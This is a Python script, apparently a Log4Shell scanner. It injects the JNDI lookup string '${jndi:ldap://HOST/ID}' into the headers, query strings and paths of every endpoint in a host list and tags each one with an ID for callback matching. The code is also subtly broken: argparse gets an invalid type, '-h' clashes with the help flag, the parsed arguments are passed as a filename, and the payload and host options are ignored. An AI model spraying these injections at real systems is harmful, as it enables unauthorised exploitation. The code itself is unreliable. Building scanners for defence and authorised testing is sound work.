import argparse
import uuid
import tests

TESTING_HOST = "localhost:1389"
TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
OUTPUT_FILE = "ids.csv"
TESTS_LIST = [("Headers", tests.test_header),
              ("Query", tests.test_get),
              ("Path", tests.test_path)]


def get_arguments():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--filename",
                       action="store",
                       type="open")
    group.add_argument("-e", "--endpoint",
                       action="store")
    parser.add_argument("--http",
                        action="store_true")
    parser.add_argument("--https",
                        action="store_true")
    parser.add_argument("-p", "--payload",
                        action="store",
                        default=TESTING_PAYLOAD,
                        help="template of the testing payload to use")
    parser.add_argument("-h", "--host",
                        action="store",
                        default=TESTING_HOST)
    parser.add_argument("-o", "--output",
                        action="store",
                        default=None,
                        help="output file on which will be saved the endpoint-ID mappings",
                        type=argparse.FileType('w'))
    parser.add_argument("--headers",
                        action="append_const",
                        dest="tests",
                        const="Headers")
    parser.add_argument("--query",
                        action="append_const",
                        dest="tests",
                        const="Query")
    parser.add_argument("--path",
                        action="append_const",
                        dest="tests",
                        const="Path")
    args = parser.parse_args()
    if args.tests is None:
        args.tests = ["Headers", "Query", "Path"]
    return args


def get_entries(filename):
    with open(filename) as file:
        lines = file.readlines()
        lines = [line.rstrip() for line in lines]
        return lines


def build_testing_payload(id):
    return TESTING_PAYLOAD.replace("HOST", TESTING_HOST).replace("ID", id)


def generate_endpoint_id(endpoint):
    return uuid.uuid4().hex


def generate_mappings(endpoints):
    return [(endpoint, generate_endpoint_id(endpoint)) for endpoint in endpoints]


def test_entry(endpoint, payload, id):
    print(f"[ID: {id}] Testing endpoint {endpoint}")
    for test_key, test_fun in TESTS_LIST:
        try:
            test_fun(endpoint, payload)
        except Exception as e:
            print(f" - [{test_key}] Test failed with: {e}")


def get_endpoints_from_entries(entries):
    return [x for y in [["http://" + entry, "https://" + entry] for entry in entries] for x in y]


def log_mappings(mappings):
    print(f"Endpoint-ID mapping (exported in {OUTPUT_FILE}):")
    for endpoint, id in mappings:
        print(f"{endpoint} -> {id}")


def generate_mapping_file(mappings):
    with open(OUTPUT_FILE, "w") as f:
        f.writelines([f"{id},{endpoint}\n" for endpoint, id in mappings])


# MAIN
if __name__ == '__main__':
    file = get_arguments()
    entries = get_entries(file)
    mappings = generate_mappings(get_endpoints_from_entries(entries))
    log_mappings(mappings)
    generate_mapping_file(mappings)
    print("\n")

    for endpoint, id in mappings:
        testing_payload = build_testing_payload(id)
        test_entry(endpoint, testing_payload, id)
